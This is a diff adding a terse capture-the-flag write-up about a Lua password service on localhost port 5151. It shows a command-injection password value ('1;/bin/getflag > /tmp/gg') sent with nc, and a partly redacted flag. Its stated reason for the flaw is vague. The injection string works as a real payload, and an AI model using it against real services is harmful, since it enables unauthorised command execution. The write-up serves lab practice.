@@ -1,0 +1,9 @@
+we can see there is a lua file.
+it use  hash() to check the password
+we are in lua 4.1 so hash() is vulnerable
+so :
+$ nc localhost 5151
+password: 1;/bin/getflag > /tmp/gg
+Erf nope...
+$ cat /tmp/gg
+fa6v[...]
